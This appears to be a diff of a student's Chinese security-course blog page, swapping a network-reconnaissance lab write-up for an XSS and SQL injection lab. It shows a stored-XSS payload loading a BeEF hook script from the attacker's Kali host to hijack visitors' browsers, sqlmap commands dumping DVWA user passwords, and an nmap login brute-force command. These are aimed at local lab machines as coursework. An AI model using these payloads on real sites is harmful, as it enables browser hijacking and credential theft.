@@ -4,11 +4,11 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="实验一：网络扫描与网络侦擦, 7562ajj的博客">
-    <meta name="description" content="1.搜索麻省理工学院网站中文件名包含“network security”的pdf文档百度搜索得到麻省理工学院官网网址：www.mit.edu
+    <meta name="keywords" content="实验三：XSS和SQL注入, 7562ajj的博客">
+    <meta name="description" content="XSS部分：利用Beef劫持被攻击者客户端浏览器搭建GuestBook网站把网站文件夹（GuestBook）复制到windows server中，通过windows server的IIS配置该网站。
 
-2.图片中的女孩在哪旅行
-根据图片中的信息38 letrentehuit cafe brasse">
+
+1、利用AWVS扫描留言簿网站（安装">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -20,7 +20,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>实验一：网络扫描与网络侦擦 | 7562ajj的博客</title>
+    <title>实验三：XSS和SQL注入 | 7562ajj的博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -337,12 +337,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">实验一：网络扫描与网络侦擦</h1>
+                    <h1 class="description center-align post-title">实验三：XSS和SQL注入</h1>
                 </div>
             </div>
         </div>
@@ -403,51 +403,60 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="1-搜索麻省理工学院网站中文件名包含“network-security”的pdf文档"><a href="#1-搜索麻省理工学院网站中文件名包含“network-security”的pdf文档" class="headerlink" title="1.搜索麻省理工学院网站中文件名包含“network security”的pdf文档"></a>1.搜索麻省理工学院网站中文件名包含“network security”的pdf文档</h2><p>百度搜索得到麻省理工学院官网网址：<a target="_blank" rel="noopener" href="http://www.mit.edu/">www.mit.edu</a></p>
-<p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221025213750287.png" alt="image-20221025213750287"></p>
-<h2 id="2-图片中的女孩在哪旅行"><a href="#2-图片中的女孩在哪旅行" class="headerlink" title="2.图片中的女孩在哪旅行"></a>2.图片中的女孩在哪旅行</h2><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/%E5%9B%BE%E7%89%871.png" alt="图片1"></p>
-<p>根据图片中的信息38 letrentehuit cafe brasserie，很明显是个咖啡店，在大众点评上查询店名</p>
-<p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221027204719071.png" alt="image-20221027204719071"></p>
-<p>有个地址信息，上地图查询该地址</p>
-<p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221027204853804.png" alt="image-20221027204853804"></p>
-<p>得到的位置是法国巴黎的一个咖啡店。</p>
-<h2 id="3-手机位置定位，通过LAC和CID查询基站位置。"><a href="#3-手机位置定位，通过LAC和CID查询基站位置。" class="headerlink" title="3.手机位置定位，通过LAC和CID查询基站位置。"></a>3.手机位置定位，通过LAC和CID查询基站位置。</h2><p>先查询自己手机的LAC和CID信息</p>
-<p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/wps1.jpg" alt="img"></p>
-<p>拿到信息之后通过微信公众号LBS（方法不唯一）查询定位手机的位置</p>
-<p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/24CBC99BFF7CE8085427041ED9FFE035.jpg" alt="img"></p>
-<h2 id="4-编码解码"><a href="#4-编码解码" class="headerlink" title="4.编码解码"></a>4.编码解码</h2><p>解密一串base64编码，直接在网上找在线工具进行解码。</p>
-<p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221028123310470.png" alt="image-20221028123310470"></p>
-<h2 id="5-地址信息"><a href="#5-地址信息" class="headerlink" title="5.地址信息"></a>5.地址信息</h2><p>5.1内网中捕获到一个以太帧，源MAC地址为：98-CA-33-02-27-B5；目的IP地址为：202.193.64.34，回答问题：该用户使用的什么品牌的设备，访问的是什么网站？</p>
-<p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221028125539465.png" alt="image-20221028125539465"></p>
-<p>再通过站长工具进行ip地址查询</p>
-<p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221028131943787.png" alt="image-20221028131943787"></p>
-<p>查询到此ip物理地址为桂林电子科技大学，进入桂电官网得到桂电官网域名为<a target="_blank" rel="noopener" href="http://www.guet.edu.cn.尝试ping,/">www.guet.edu.cn。尝试ping，</a></p>
-<p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221028132845503.png" alt="image-20221028132845503"></p>
-<p>由此可以得出该用户使用苹果设备访问的桂电官网。</p>
-<p>5.2 访问<a href="https://whatismyipaddress.com得到MyIP信息，利用ipconfig(Windows)或ifconfig(Linux)查看本机IP地址，两者值相同吗？如果不相同的话，说明原因。">https://whatismyipaddress.com得到MyIP信息，利用ipconfig(Windows)或ifconfig(Linux)查看本机IP地址，两者值相同吗？如果不相同的话，说明原因。</a></p>
-<p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221028135905180.png" alt="image-20221028135905180"></p>
-<p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221028135123568.png" alt="image-20221028135123568"></p>
-<p>两者不一样，因为前者查询的是公网ip，后者查询的是内网ip。</p>
-<h2 id="6-nmap的使用"><a href="#6-nmap的使用" class="headerlink" title="6.nmap的使用"></a>6.nmap的使用</h2><h3 id="6-1利用NMAP扫描Metasploitable2的端口开放情况，并说明其中其中四个端口开放的服务。"><a href="#6-1利用NMAP扫描Metasploitable2的端口开放情况，并说明其中其中四个端口开放的服务。" class="headerlink" title="6.1利用NMAP扫描Metasploitable2的端口开放情况，并说明其中其中四个端口开放的服务。"></a>6.1利用NMAP扫描Metasploitable2的端口开放情况，并说明其中其中四个端口开放的服务。</h3><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221028140922525.png" alt="image-20221028140922525"></p>
-<p>22端口开放ssh服务：SSH 为 [Secure Shell](<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Secure">https://baike.baidu.com/item/Secure</a> Shell?fromModule&#x3D;lemma_inlink) 的缩写，其为建立在应用层基础上的专为<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95/1071998?fromModule=lemma_inlink">远程登录</a>会话和其他网络服务提供安全性的协议</p>
-<p>80端口开放http服务：为网站服务器，开启之后可用浏览器进行访问。</p>
-<p>21端口开放ftp服务：FTP是FileTransferProtocol(文件传输协议)的英文简称,而中文简称为“文传协议”，一般用于数据的上传或下载。</p>
-<p>3306端口开放mysql服务：指开启了mysql数据库，是一个关系型数据库管理系统。</p>
-<h3 id="6-2利用NMAP扫描Metasploitable2的操作系统类型"><a href="#6-2利用NMAP扫描Metasploitable2的操作系统类型" class="headerlink" title="6.2利用NMAP扫描Metasploitable2的操作系统类型."></a>6.2利用NMAP扫描Metasploitable2的操作系统类型.</h3><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221028142301496.png" alt="image-20221028142301496"></p>
-<h3 id="6-3-利用NMAP穷举-Metasploitable2上dvwa的登录账号和密码"><a href="#6-3-利用NMAP穷举-Metasploitable2上dvwa的登录账号和密码" class="headerlink" title="6.3 利用NMAP穷举 Metasploitable2上dvwa的登录账号和密码"></a>6.3 利用NMAP穷举 Metasploitable2上dvwa的登录账号和密码</h3><p>使用命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 80 --script=http-form-brute --script-args=http-form-brute.path=/dvwa/login.php 靶机ip</span><br></pre></td></tr></table></figure>
+                <h2 id="XSS部分：利用Beef劫持被攻击者客户端浏览器"><a href="#XSS部分：利用Beef劫持被攻击者客户端浏览器" class="headerlink" title="XSS部分：利用Beef劫持被攻击者客户端浏览器"></a>XSS部分：利用Beef劫持被攻击者客户端浏览器</h2><h3 id="搭建GuestBook网站"><a href="#搭建GuestBook网站" class="headerlink" title="搭建GuestBook网站"></a>搭建GuestBook网站</h3><p>把网站文件夹（GuestBook）复制到windows server中，通过windows server的IIS配置该网站。</p>
+<p><img src="/./%E5%AE%9E%E9%AA%8C%E4%B8%89/1.png"></p>
+<p><img src="/./%E5%AE%9E%E9%AA%8C%E4%B8%89/2.png"><img src="/./%E5%AE%9E%E9%AA%8C%E4%B8%89/3.png"></p>
+<h2 id="1、利用AWVS扫描留言簿网站（安装见参考文档0-AWVS安装与使用-docx），发现其存在XSS漏洞，截图。"><a href="#1、利用AWVS扫描留言簿网站（安装见参考文档0-AWVS安装与使用-docx），发现其存在XSS漏洞，截图。" class="headerlink" title="1、利用AWVS扫描留言簿网站（安装见参考文档0.AWVS安装与使用.docx），发现其存在XSS漏洞，截图。"></a>1、利用AWVS扫描留言簿网站（安装见参考文档0.AWVS安装与使用.docx），发现其存在XSS漏洞，截图。</h2><p><img src="/./%E5%AE%9E%E9%AA%8C%E4%B8%89/4.png"></p>
+<h2 id="2、-Kali使用beef生成恶意代码，截图。"><a href="#2、-Kali使用beef生成恶意代码，截图。" class="headerlink" title="2、 Kali使用beef生成恶意代码，截图。"></a>2、 Kali使用beef生成恶意代码，截图。</h2><p><img src="/./%E5%AE%9E%E9%AA%8C%E4%B8%89/5.png"></p>
+<h2 id="3、访问http-x2F-x2F-留言簿网站-x2F-message-asp-将以下恶意代码写入网站留言板，"><a href="#3、访问http-x2F-x2F-留言簿网站-x2F-message-asp-将以下恶意代码写入网站留言板，" class="headerlink" title="3、访问http:&#x2F;&#x2F;留言簿网站&#x2F;message.asp;将以下恶意代码写入网站留言板，"></a>3、访问http:&#x2F;&#x2F;留言簿网站&#x2F;message.asp;将以下恶意代码写入网站留言板，</h2><script src="http://Kali的IP地址:3000/hook.js"></script>，截图。
 
-<p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221028181213519.png" alt="image-20221028181213519"></p>
-<p>成功爆破得到有效登录口令admin&#x2F;password</p>
-<h3 id="6-4-查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。"><a href="#6-4-查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。" class="headerlink" title="6.4 查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。"></a>6.4 查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。</h3><p>永恒之蓝漏洞在2017年5月12日爆发，席卷全球。该漏洞存在于windows操作系统，利用的是Windows SMB远程提权漏洞，可以攻击开放了445 端口的 Windows 系统并提升至系统权限，潜入电脑对多种文件类型加密，并弹出勒索框，向用户索要赎金(以比特币支付)用于解密。该病毒只攻击Windows系统的电脑，几乎所有的Windows系统如果没有打补丁，都会被攻击。</p>
-<h2 id="7-利用ZoomEye搜索一个西门子公司工控设备，并描述其可能存在的安全问题。"><a href="#7-利用ZoomEye搜索一个西门子公司工控设备，并描述其可能存在的安全问题。" class="headerlink" title="7.利用ZoomEye搜索一个西门子公司工控设备，并描述其可能存在的安全问题。"></a>7.利用ZoomEye搜索一个西门子公司工控设备，并描述其可能存在的安全问题。</h2><p>进入到zoomeye官网，搜索西门子工控设备，查看其相关漏洞</p>
-<p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221028200906966.png" alt="image-20221028200906966"></p>
-<p>存在多个高危漏洞，那么可能就会被一些黑客利用，这样的话信息泄露严在所难免，上传漏洞被利用的话还可能会被挂个马啥的，再严重的话比如rce、权限提升漏洞，或者多个漏洞一起打一套组合拳，就可能会服务器系统崩溃等一系列严重的问题。</p>
-<h2 id="8-Winhex简单数据恢复与取证"><a href="#8-Winhex简单数据恢复与取证" class="headerlink" title="8.Winhex简单数据恢复与取证"></a>8.Winhex简单数据恢复与取证</h2><h3 id="8-1-elephant-jpg不能打开了，利用工具将其修复，说明修复过程。"><a href="#8-1-elephant-jpg不能打开了，利用工具将其修复，说明修复过程。" class="headerlink" title="8.1 elephant.jpg不能打开了，利用工具将其修复，说明修复过程。"></a>8.1 elephant.jpg不能打开了，利用工具将其修复，说明修复过程。</h3><p>图片打不开应该是因为文件头或者文件尾错误导致的，jpg的文件头为FF D8 FF 文件尾为FF D9。将图片用010或者winhex打开发现是文件头错误，将0000修改为FFD8就能正常打开了，</p>
-<p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221028203013588.png" alt="image-20221028203013588"></p>
-<h3 id="8-2-笑脸背后的阴霾：图片smile有什么隐藏信息"><a href="#8-2-笑脸背后的阴霾：图片smile有什么隐藏信息" class="headerlink" title="8.2 笑脸背后的阴霾：图片smile有什么隐藏信息"></a>8.2 笑脸背后的阴霾：图片smile有什么隐藏信息</h3><p>将图片用010或者winhex打开，在最底部就会发现隐藏的信息：tom is the killer</p>
-<p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221028205344679.png" alt="image-20221028205344679"></p>
-<h3 id="8-3"><a href="#8-3" class="headerlink" title="8.3"></a>8.3</h3><h2 id="9-讨论学校热点GUET-WiFi的安全问题"><a href="#9-讨论学校热点GUET-WiFi的安全问题" class="headerlink" title="9.讨论学校热点GUET-WiFi的安全问题"></a>9.讨论学校热点GUET-WiFi的安全问题</h2><p>对于学校的WiFi，这自然是不安全的，没有密码的wifi，数据传递过程中的数据也是没有进行加密的，所以说假如大家都在连校园wifi，此时大家都处于一个网段下，大家上网的数据都是可以被其他人给拦截到的，这其中可能就包括了你登陆某一个网站时输入的账号密码信息等，这样就毫无安全可言。或者是有一些人稍微有点技术，他想搞点事情，他可以制作一个钓鱼wifi，将wifi名称改成和校园网一模一样的，然后趁着真正的校园网崩溃的时候，将此WiFi散发出去，让大家连，此时大家就都中了他的计谋，这时候连上这个wifi的同学就没有任何隐私了。</p>
+<p><img src="/./%E5%AE%9E%E9%AA%8C%E4%B8%89/6.png"></p>
+<p>之后，客户端访问这个页面，kali的beef中都会劫持到。</p>
+<h2 id="4、管理员登录login-htm，账号密码均为admin，审核用户留言。只要客户端访问这个服务器的留言板，客户端浏览器就会被劫持，指定被劫持网站为学校主页，将你在beff中的配置截图。"><a href="#4、管理员登录login-htm，账号密码均为admin，审核用户留言。只要客户端访问这个服务器的留言板，客户端浏览器就会被劫持，指定被劫持网站为学校主页，将你在beff中的配置截图。" class="headerlink" title="4、管理员登录login.htm，账号密码均为admin，审核用户留言。只要客户端访问这个服务器的留言板，客户端浏览器就会被劫持，指定被劫持网站为学校主页，将你在beff中的配置截图。"></a>4、管理员登录login.htm，账号密码均为admin，审核用户留言。只要客户端访问这个服务器的留言板，客户端浏览器就会被劫持，指定被劫持网站为学校主页，将你在beff中的配置截图。</h2><p>通过beef的控制台，让被劫持的主机访问桂电官网。</p>
+<p><img src="/./%E5%AE%9E%E9%AA%8C%E4%B8%89/7.png"></p>
+<p>再到靶机看看效果</p>
+<p><img src="/./%E5%AE%9E%E9%AA%8C%E4%B8%89/8.png"></p>
+<h2 id="5、回答问题：实验中XSS攻击属于哪种类型？"><a href="#5、回答问题：实验中XSS攻击属于哪种类型？" class="headerlink" title="5、回答问题：实验中XSS攻击属于哪种类型？"></a>5、回答问题：实验中XSS攻击属于哪种类型？</h2><p>存储型xss</p>
+<h1 id="SQL注入部分：DVWA-SQLmap-Mysql注入实战"><a href="#SQL注入部分：DVWA-SQLmap-Mysql注入实战" class="headerlink" title="SQL注入部分：DVWA+SQLmap+Mysql注入实战"></a>SQL注入部分：DVWA+SQLmap+Mysql注入实战</h1><h2 id="1、注入点发现。首先肯定是要判断是否有注入漏洞。"><a href="#1、注入点发现。首先肯定是要判断是否有注入漏洞。" class="headerlink" title="1、注入点发现。首先肯定是要判断是否有注入漏洞。"></a>1、注入点发现。首先肯定是要判断是否有注入漏洞。</h2><p>输入框输入1，能够正常回显。输入1’，报错。</p>
+<p><img src="/./%E5%AE%9E%E9%AA%8C%E4%B8%89/9.png"></p>
+<p><img src="/./%E5%AE%9E%E9%AA%8C%E4%B8%89/10.png"></p>
+<p>此时说明参数id处存在sql注入。</p>
+<h2 id="下面利用SQLMap进行注入攻击。将DVWA安全级别设置为最低；"><a href="#下面利用SQLMap进行注入攻击。将DVWA安全级别设置为最低；" class="headerlink" title="下面利用SQLMap进行注入攻击。将DVWA安全级别设置为最低；"></a>下面利用SQLMap进行注入攻击。将DVWA安全级别设置为最低；</h2><h3 id="1、枚举当前使用的数据库名称和用户名。"><a href="#1、枚举当前使用的数据库名称和用户名。" class="headerlink" title="1、枚举当前使用的数据库名称和用户名。"></a>1、枚举当前使用的数据库名称和用户名。</h3><p>先通过抓包获取当前的cookie值</p>
+<p><img src="/./%E5%AE%9E%E9%AA%8C%E4%B8%89/11.png"></p>
+<p>丢到sqlmap里跑数据库名和用户名</p>
+<p>命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.217.144/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&#x27;security=low; PHPSESSID=27beb22d4da23e6c86b141560143beb0&#x27; -b --current-db --current-user</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./%E5%AE%9E%E9%AA%8C%E4%B8%89/12.png"></p>
+<h3 id="3、枚举数据库用户名和密码"><a href="#3、枚举数据库用户名和密码" class="headerlink" title="3、枚举数据库用户名和密码"></a>3、枚举数据库用户名和密码</h3><p>命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.217.144/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&#x27;security=low; PHPSESSID=27beb22d4da23e6c86b141560143beb0&#x27; --users --password</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./%E5%AE%9E%E9%AA%8C%E4%B8%89/13.png"></p>
+<h3 id="4、枚举数据库"><a href="#4、枚举数据库" class="headerlink" title="4、枚举数据库"></a>4、枚举数据库</h3><p>命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.217.144/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&#x27;security=low; PHPSESSID=27beb22d4da23e6c86b141560143beb0&#x27; --dbs</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./%E5%AE%9E%E9%AA%8C%E4%B8%89/14.png"></p>
+<h3 id="5、枚举数据库和指定数据库的数据表"><a href="#5、枚举数据库和指定数据库的数据表" class="headerlink" title="5、枚举数据库和指定数据库的数据表"></a>5、枚举数据库和指定数据库的数据表</h3><p>-D：指定的数据库</p>
+<p>-T：指定数据库中的数据表</p>
+<p>爆破dvwa数据库下的所有表：</p>
+<p>命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.217.144/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&#x27;security=low; PHPSESSID=27beb22d4da23e6c86b141560143beb0&#x27; -D &#x27;dvwa&#x27; --tables  </span><br></pre></td></tr></table></figure>
+
+<p><img src="/./%E5%AE%9E%E9%AA%8C%E4%B8%89/15.png"></p>
+<h3 id="6、获取指定数据库和表中所有列的信息"><a href="#6、获取指定数据库和表中所有列的信息" class="headerlink" title="6、获取指定数据库和表中所有列的信息"></a>6、获取指定数据库和表中所有列的信息</h3><p>–columns：获取列的信息</p>
+<p>爆破dvwa库的users表下的所有列：</p>
+<p>命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.217.144/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&#x27;security=low; PHPSESSID=27beb22d4da23e6c86b141560143beb0&#x27; -D &#x27;dvwa&#x27; -T &#x27;users&#x27; --columns</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./%E5%AE%9E%E9%AA%8C%E4%B8%89/16.png"></p>
+<h3 id="7、枚举指定数据表中的所有用户名与密码-并down到本地。"><a href="#7、枚举指定数据表中的所有用户名与密码-并down到本地。" class="headerlink" title="7、枚举指定数据表中的所有用户名与密码,并down到本地。"></a>7、枚举指定数据表中的所有用户名与密码,并down到本地。</h3><p>-C：枚举数据表中的列</p>
+<p>–dump：存储数据表项</p>
+<p>命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.217.144/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&#x27;security=low; PHPSESSID=27beb22d4da23e6c86b141560143beb0&#x27; -D &#x27;dvwa&#x27; -T &#x27;users&#x27; -C &#x27;password&#x27; --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./%E5%AE%9E%E9%AA%8C%E4%B8%89/17.png"></p>
+<p>结果也已经自动保存到本地</p>
+<p><img src="/./%E5%AE%9E%E9%AA%8C%E4%B8%89/18.png"></p>
 <span id="more"></span>
 
 <hr>
@@ -479,7 +488,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/11/24/2022-10-28-shi-yan-1-wang-luo-sao-miao-yu-wang-luo-zhen-cha/">http://example.com/2022/11/24/2022-10-28-shi-yan-1-wang-luo-sao-miao-yu-wang-luo-zhen-cha/</a>
+                    <a href="http://example.com/2022/11/24/shi-yan-san/">http://example.com/2022/11/24/shi-yan-san/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -601,20 +610,23 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2022/11/24/2022-11-7-shi-yan-er/">
+                <a href="/2022/11/24/shi-yan-si/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="实验二：网络嗅探与身份认证">
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="实验四：CTF实践">
                         
-                        <span class="card-title">实验二：网络嗅探与身份认证</span>
+                        <span class="card-title">实验四：CTF实践</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            网络嗅探与身份认证1.A主机上外网，B运行sinffer(Wireshark)选定只抓源为A的数据)1.1 写出以上过滤语句ip.src&#x3D;&#x3D;A的ip
-1.2 在互联网上找到任意一个以明文方式传递用户帐号、密码的网站，B是
+                            实验准备：
+攻击机：kali：192.168.217.139
+靶机WebDeveloper：192.168.217.148
+1、发现目标 (netdiscover)，找到WebDeveloper的IP地址。截图。
+2、:利用NMAP扫描目标
                         
                     </div>
                     <div class="publish-info">
@@ -647,20 +659,20 @@
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/11/24/2022-10-07-guan-yu-xu-ni-ji-de-san-chong-wang-luo-mo-shi/">
+                <a href="/2022/11/24/shi-yan-er/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="关于kali用不同的网络模式下与物理机的关系">
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="实验二：网络嗅探与身份认证">
                         
-                        <span class="card-title">关于kali用不同的网络模式下与物理机的关系</span>
+                        <span class="card-title">实验二：网络嗅探与身份认证</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            关于kali用不同的网络模式下与物理机的关系（是否在同一个子网）前期准备1.下载VMware和kali虚拟机。
-虚拟机中的三种不同的网络模式一.桥接模式 桥接模式下，虚拟机和物理机处于同一网段，可以和外部处于同一网段的计算机进行直接通信。如
+                            网络嗅探与身份认证1.A主机上外网，B运行sinffer(Wireshark)选定只抓源为A的数据)1.1 写出以上过滤语句ip.src&#x3D;&#x3D;A的ip
+1.2 在互联网上找到任意一个以明文方式传递用户帐号、密码的网站，B是
                         
                     </div>
                     <div class="publish-info">
